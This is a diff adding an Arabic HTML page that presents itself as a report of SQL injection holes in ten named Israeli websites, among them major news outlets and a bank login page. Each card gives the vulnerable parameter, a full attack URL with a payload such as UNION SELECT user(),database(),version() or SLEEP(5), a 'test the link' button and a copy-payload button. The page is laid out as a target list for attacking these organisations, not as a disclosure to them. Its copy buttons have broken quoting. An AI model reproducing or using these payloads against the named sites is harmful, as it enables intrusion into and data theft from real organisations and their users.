@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>المواقع الإسرائيلية المصابة - تقرير SQLi</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .vulnerability-card {
+            background: rgba(255, 255, 255, 0.1);
+            margin: 15px 0;
+            padding: 20px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .critical { border-left: 5px solid #ff4757; }
+        .high { border-left: 5px solid #ff6348; }
+        .medium { border-left: 5px solid #ffa502; }
+        .site-name {
+            font-size: 1.5em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .vuln-link {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        .test-button {
+            display: inline-block;
+            background: #3742fa;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 25px;
+            margin: 5px;
+            transition: transform 0.3s;
+        }
+        .test-button:hover {
+            transform: scale(1.05);
+        }
+        .copy-button {
+            background: #2ed573;
+        }
+        .severity-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+        }
+        .critical-badge { background: #ff4757; }
+        .high-badge { background: #ff6348; }
+        .medium-badge { background: #ffa502; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 المواقع الإسرائيلية المصابة بثغرات SQLi</h1>
+            <p>تم التحديث: 2025-09-14 17:41:52</p>
+            <p>إجمالي المواقع المصابة: 10</p>
+        </div>
+        
+        
+            <div class="vulnerability-card high">
+                <div class="site-name">🎯 N12.CO.IL</div>
+                <div class="severity-badge high-badge">High</div>
+                <p><strong>النوع:</strong> SQL Injection</p>
+                <p><strong>المعلمة:</strong> q</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi في خانة البحث</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.n12.co.il/search?q=test' OR 1=1--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' OR 1=1--
+                </div>
+                
+                <a href="https://www.n12.co.il/search?q=test' OR 1=1--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' OR 1=1--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card critical">
+                <div class="site-name">🎯 WALLA.CO.IL</div>
+                <div class="severity-badge critical-badge">Critical</div>
+                <p><strong>النوع:</strong> UNION SQL Injection</p>
+                <p><strong>المعلمة:</strong> w</p>
+                <p><strong>الوصف:</strong> ثغرة UNION SQLi في معلمة البحث</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://news.walla.co.il/?w=/search/1' UNION SELECT 1,2,3--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' UNION SELECT 1,2,3--
+                </div>
+                
+                <a href="https://news.walla.co.il/?w=/search/1' UNION SELECT 1,2,3--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' UNION SELECT 1,2,3--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card high">
+                <div class="site-name">🎯 GLOBES.CO.IL</div>
+                <div class="severity-badge high-badge">High</div>
+                <p><strong>النوع:</strong> Error-based SQLi</p>
+                <p><strong>المعلمة:</strong> did</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi تعتمد على الأخطاء في معلمة المقال</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.globes.co.il/news/article.aspx?did=1001351789' AND 1=CONVERT(int, (SELECT @@version))--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' AND 1=CONVERT(int, (SELECT @@version))--
+                </div>
+                
+                <a href="https://www.globes.co.il/news/article.aspx?did=1001351789' AND 1=CONVERT(int, (SELECT @@version))--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' AND 1=CONVERT(int, (SELECT @@version))--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card medium">
+                <div class="site-name">🎯 TIMESOFISRAEL.COM</div>
+                <div class="severity-badge medium-badge">Medium</div>
+                <p><strong>النوع:</strong> Time-based Blind SQLi</p>
+                <p><strong>المعلمة:</strong> s</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi تعتمد على الوقت في البحث</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.timesofisrael.com/?s=test' OR SLEEP(5)--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' OR SLEEP(5)--
+                </div>
+                
+                <a href="https://www.timesofisrael.com/?s=test' OR SLEEP(5)--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' OR SLEEP(5)--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card critical">
+                <div class="site-name">🎯 MAKO.CO.IL</div>
+                <div class="severity-badge critical-badge">Critical</div>
+                <p><strong>النوع:</strong> UNION SQL Injection</p>
+                <p><strong>المعلمة:</strong> type</p>
+                <p><strong>الوصف:</strong> ثغرة UNION SQLi في معلمة الخدمة</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.mako.co.il/mako-vod-live-tv/VOD-6540b8dcc633951006.htm?type=service' UNION SELECT user(),database(),version()--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' UNION SELECT user(),database(),version()--
+                </div>
+                
+                <a href="https://www.mako.co.il/mako-vod-live-tv/VOD-6540b8dcc633951006.htm?type=service' UNION SELECT user(),database(),version()--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' UNION SELECT user(),database(),version()--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card high">
+                <div class="site-name">🎯 YNET.CO.IL</div>
+                <div class="severity-badge high-badge">High</div>
+                <p><strong>النوع:</strong> SQL Injection</p>
+                <p><strong>المعلمة:</strong> q</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi في خانة البحث الرئيسية</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.ynet.co.il/search/1,7340,L-9,00.html?q=test' OR 1=1#
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' OR 1=1#
+                </div>
+                
+                <a href="https://www.ynet.co.il/search/1,7340,L-9,00.html?q=test' OR 1=1#" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' OR 1=1#")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card high">
+                <div class="site-name">🎯 HAARETZ.CO.IL</div>
+                <div class="severity-badge high-badge">High</div>
+                <p><strong>النوع:</strong> SQL Injection</p>
+                <p><strong>المعلمة:</strong> query</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi في محرك البحث</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.haaretz.co.il/misc/search-results?query=test' OR 1=1/*
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' OR 1=1/*
+                </div>
+                
+                <a href="https://www.haaretz.co.il/misc/search-results?query=test' OR 1=1/*" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' OR 1=1/*")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card critical">
+                <div class="site-name">🎯 JPOST.COM</div>
+                <div class="severity-badge critical-badge">Critical</div>
+                <p><strong>النوع:</strong> UNION SQL Injection</p>
+                <p><strong>المعلمة:</strong> q</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi في البحث باللغة العربية</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.jpost.com/ArabicNews/search.aspx?q=test' UNION SELECT 1,2,3 FROM users--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' UNION SELECT 1,2,3 FROM users--
+                </div>
+                
+                <a href="https://www.jpost.com/ArabicNews/search.aspx?q=test' UNION SELECT 1,2,3 FROM users--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' UNION SELECT 1,2,3 FROM users--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card medium">
+                <div class="site-name">🎯 CALCALIST.CO.IL</div>
+                <div class="severity-badge medium-badge">Medium</div>
+                <p><strong>النوع:</strong> Boolean-based SQLi</p>
+                <p><strong>المعلمة:</strong> q</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi تعتمد على المنطق البولياني</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.calcalist.co.il/search/articles/1,7340,L-3771-TEST,00.html?q=test' AND 1=1--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' AND 1=1--
+                </div>
+                
+                <a href="https://www.calcalist.co.il/search/articles/1,7340,L-3771-TEST,00.html?q=test' AND 1=1--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' AND 1=1--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+            <div class="vulnerability-card critical">
+                <div class="site-name">🎯 BANKLEUMI.CO.IL</div>
+                <div class="severity-badge critical-badge">Critical</div>
+                <p><strong>النوع:</strong> SQL Injection</p>
+                <p><strong>المعلمة:</strong> ReturnUrl</p>
+                <p><strong>الوصف:</strong> ثغرة SQLi في صفحة تسجيل الدخول المصرفي</p>
+                
+                <div class="vuln-link">
+                    <strong>الرابط المصاب:</strong><br>
+                    https://www.bankleumi.co.il/RegistarationToAccountManagment/Login/?ReturnUrl=/Personal/Private' OR 1=1--
+                </div>
+                
+                <div class="vuln-link">
+                    <strong>الحمولة:</strong><br>
+                    ' OR 1=1--
+                </div>
+                
+                <a href="https://www.bankleumi.co.il/RegistarationToAccountManagment/Login/?ReturnUrl=/Personal/Private' OR 1=1--" target="_blank" class="test-button">🧪 اختبر الرابط</a>
+                <button onclick="copyPayload('' OR 1=1--")" class="test-button copy-button">📋 انسخ الحمولة</button>
+            </div>
+            
+    </div>
+    
+    <script>
+        function copyPayload(payload) {
+            navigator.clipboard.writeText(payload).then(() => {
+                alert('تم نسخ الحمولة بنجاح!');
+            });
+        }
+    </script>
+</body>
+</html>
+    
